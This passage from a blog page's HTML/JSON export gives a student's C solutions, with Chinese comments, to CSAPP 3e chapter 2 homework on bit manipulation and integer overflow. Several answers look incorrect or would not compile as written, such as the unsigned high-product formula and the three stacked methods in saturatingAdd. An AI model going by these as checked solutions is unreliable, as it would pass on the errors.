class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">oddOnesV1</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//思路，用xor消掉成对的1，不成对的记录下来</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">oddOnesV2</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//思路与上一个函数类似</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">1</span>;\t<span class=\"comment\">//思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位）</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">2</span>;\t<span class=\"comment\">//只考虑mod4==0的位置</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">4</span>;\t<span class=\"comment\">//只考虑mod8==0的位置</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">8</span>;\t<span class=\"comment\">//只考虑mod16==0的位置</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">16</span>;\t<span class=\"comment\">//只考虑mod32==0的位置</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-66\"><a href=\"#2-66\" class=\"headerlink\" title=\"2.66\"></a>2.66</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">leftMostOne</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x-(x&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-67\"><a href=\"#2-67\" class=\"headerlink\" title=\"2.67\"></a>2.67</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">intSizeIs32</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> INT_MAX==<span class=\"number\">0x80000000</span><span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-68\"><a href=\"#2-68\" class=\"headerlink\" title=\"2.68\"></a>2.68</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">lowerOneMark</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = -!(n-(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>));\t<span class=\"comment\">//方法1</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"number\">1</span>&lt;&lt;n)<span class=\"number\">-1</span>&amp;~t | t;</span><br><span class=\"line\"><span class=\"comment\">//\treturn ((n!=(sizeof(int)&lt;&lt;3))&lt;&lt;n)-1;\t//方法2</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-69\"><a href=\"#2-69\" class=\"headerlink\" title=\"2.69\"></a>2.69</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">rotateLeft</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;((<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">unsigned</span>)&lt;&lt;<span class=\"number\">3</span>)-n<span class=\"number\">-1</span>)&gt;&gt;<span class=\"number\">1</span> | x&lt;&lt;n;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-70\"><a href=\"#2-70\" class=\"headerlink\" title=\"2.70\"></a>2.70</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fitBits</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;n<span class=\"number\">-1</span>==<span class=\"number\">0</span> | x&gt;&gt;n<span class=\"number\">-1</span>==<span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-71\"><a href=\"#2-71\" class=\"headerlink\" title=\"2.71\"></a>2.71</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">pack_t</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">xbyte</span><span class=\"params\">(<span class=\"keyword\">pack_t</span> word, <span class=\"keyword\">int</span> bytenum)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)word&lt;&lt;(<span class=\"number\">3</span>-bytenum&lt;&lt;<span class=\"number\">3</span>)&gt;&gt;<span class=\"number\">24</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-73\"><a href=\"#2-73\" class=\"headerlink\" title=\"2.73\"></a>2.73</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">saturatingAdd</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//方法一</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = ((<span class=\"keyword\">unsigned</span>)x&gt;&gt;t)+((<span class=\"keyword\">unsigned</span>)y&gt;&gt;t)+((<span class=\"keyword\">unsigned</span>)x+y&gt;&gt;t);</span><br><span class=\"line\">\tt = ((<span class=\"keyword\">unsigned</span>)x&gt;&gt;t)+((<span class=\"keyword\">unsigned</span>)y&gt;&gt;t);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -(p==<span class=\"number\">2</span>&amp;&amp;t!=<span class=\"number\">1</span>)&amp;INT_MIN | -(p==<span class=\"number\">1</span>&amp;&amp;t!=<span class=\"number\">1</span>)&amp;INT_MAX | -(p==<span class=\"number\">0</span>||t==<span class=\"number\">1</span>)&amp;x+y | -(p==<span class=\"number\">3</span>||t==<span class=\"number\">1</span>)&amp;x+y;</span><br><span class=\"line\">  </span><br><span class=\"line\">\t<span class=\"comment\">//方法二</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = ((<span class=\"keyword\">unsigned</span>)x&gt;&gt;t&lt;&lt;<span class=\"number\">2</span>)|((<span class=\"keyword\">unsigned</span>)y&gt;&gt;t&lt;&lt;<span class=\"number\">1</span>)|((<span class=\"keyword\">unsigned</span>)x+y&gt;&gt;t);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -(p==<span class=\"number\">6</span>)&amp;INT_MIN | -(p==<span class=\"number\">1</span>)&amp;INT_MAX | -(p!=<span class=\"number\">1</span>&amp;&amp;p!=<span class=\"number\">6</span>)&amp;x+y;</span><br><span class=\"line\">  </span><br><span class=\"line\">\t<span class=\"comment\">//方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904）</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> w=<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> sum = x+y;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mask = <span class=\"number\">1</span>&lt;&lt;(w<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x_lmb = x&amp;mask;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> y_lmb = y&amp;mask;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> sum_lmb = sum&amp;mask;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> neg_of = x_lmb &amp;&amp; y_lmb &amp;&amp; (!sum_lmb);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> pos_of = !x_lmb &amp;&amp; !y_lmb &amp;&amp; sum_lmb;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t(pos_of &amp;&amp;(sum=INT_MAX)) || (neg_of &amp;&amp; (sum = INT_MIN)); <span class=\"comment\">//这一条不错</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-74\"><a href=\"#2-74\" class=\"headerlink\" title=\"2.74\"></a>2.74</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">tsubOk</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = (<span class=\"keyword\">unsigned</span>)x&gt;&gt;t&lt;&lt;<span class=\"number\">2</span> | (<span class=\"keyword\">unsigned</span>)-y&gt;&gt;t&lt;&lt;<span class=\"number\">1</span> | (<span class=\"keyword\">unsigned</span>)x-y&gt;&gt;t;</span><br><span class=\"line\">\tt = y==INT_MIN;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p!=<span class=\"number\">6</span> &amp;&amp; p!=<span class=\"number\">1</span> &amp;&amp; !t || t &amp;&amp; p==<span class=\"number\">6</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-75\"><a href=\"#2-75\" class=\"headerlink\" title=\"2.75\"></a>2.75</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">unsignedHightProd</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">unsigned</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> t = signed_high_prod(x, y);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> l = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> t + (x&gt;&gt;l)*x+(y&gt;&gt;l)*y;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-76\"><a href=\"#2-76\" class=\"headerlink\" title=\"2.76\"></a>2.76</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span>* <span class=\"title\">Calloc</span><span class=\"params\">(<span class=\"keyword\">size_t</span> nmemb, <span class=\"keyword\">size_t</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> t = nmemb*size;</span><br><span class=\"line\">\t<span class=\"keyword\">void</span> *p;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!size || t/size==nmemb)&#123;</span><br><span class=\"line\">\t\tp = <span class=\"built_in\">malloc</span>(t);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!p)<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(p, <span class=\"number\">0</span>, t);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-77\"><a href=\"#2-77\" class=\"headerlink\" title=\"2.77\"></a>2.77</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f2_77</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k1 = (x&lt;&lt;<span class=\"number\">4</span>)+x;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k2 = -(x&lt;&lt;<span class=\"number\">3</span>)+x;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k3 = (x&lt;&lt;<span class=\"number\">6</span>)-(x&lt;&lt;<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k4 = -(x&lt;&lt;<span class=\"number\">7</span>)+(x&lt;&lt;<span class=\"number\">4</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (k1==x*<span class=\"number\">17</span>)&lt;&lt;<span class=\"number\">3</span> | (k2==x*<span class=\"number\">-7</span>)&lt;&lt;<span class=\"number\">2</span> | (k3==x*<span class=\"number\">60</span>)&lt;&lt;<span class=\"number\">1</span> | k4==x*<span class=\"number\">-112</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-78\"><a href=\"#2-78\" class=\"headerlink\" title=\"2.78\"></a>2.78</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dividePower2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> l = <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\tl = -(x&gt;&gt;l<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (l&lt;&lt;k)-l+x &gt;&gt; k;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-79\"><a href=\"#2-79\" class=\"headerlink\" title=\"2.79\"></a>2.79</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">mul3div4</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tx = (x&lt;&lt;<span class=\"number\">2</span>) - x;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> l = <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = -(x&gt;&gt;l<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (t&lt;&lt;<span class=\"number\">2</span>)-t+x &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-80\"><a href=\"#2-80\" class=\"headerlink\" title=\"2.80\"></a>2.80</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">threefourths</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = x&amp;<span class=\"number\">0x3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t2 = -(x&gt;&gt;(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = (x&gt;&gt;<span class=\"number\">2</span>);</span><br><span class=\"line\">\tp = (p&lt;&lt;<span class=\"number\">1</span>)+p;</span><br><span class=\"line\">\tt = (t&lt;&lt;<span class=\"number\">1</span>)+t;</span><br><span class=\"line\">\tp += (t&gt;&gt;<span class=\"number\">2</span>) + (t2&amp;&amp;t);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-81\"><a href=\"#2-81\" class=\"headerlink\" title=\"2.81\"></a>2.81</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">hw281A</span><span class=\"params\">(<span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;k-!!k&lt;&lt;!!k);\t<span class=\"comment\">//k may equal to 0 or 32;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">hw281B</span><span class=\"params\">(<span class=\"keyword\">int</span> j, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = k+j;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;j-!!j&lt;&lt;!!j)) ^ (<span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;t-!!t&lt;&lt;!!t));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-82\"><a href=\"#2-82\" class=\"headerlink\" title=\"2.82\"></a>2.82</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * A: NO; x== 0x10000000, B==rand();</span></span><br><span class=\"line\"><span class=\"comment\"> * B: Yes; </span></span><br><span class=\"line\"><span class=\"comment\"> * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。</span></span><br><span class=\"line\"><span class=\"comment\"> * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加</span></span><br><span class=\"line\"><span class=\"comment\"> * D: Yes;</span></span><br><span class=\"line\"><span class=\"comment\"> * E: Yes;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"2-83\"><a href=\"#2-83\" class=\"headerlink\" title=\"2.83\"></a>2.83</h2><p>$\\sum_{i=1}^{\\infty}Y<em>2^{-k</em>i}$</p>\n<h2 id=\"2-84\"><a href=\"#2-84\" class=\"headerlink\" title=\"2.84\"></a>2.84</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> ((sx&lt;sy) &amp;&amp; ux!=<span class=\"number\">0</span> &amp;&amp; uy!=<span class=\"number\">0x80000000</span>) | (sx==sy) &amp; !!(ux-uy);</span><br></pre></td></tr></table></figure>\n","slug":"CSAPP3e-第二章作业","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Homework","slug":"CSAPP-Homework","permalink":"https://h-zex.github.io/tags/CSAPP-Homework/"}]}]}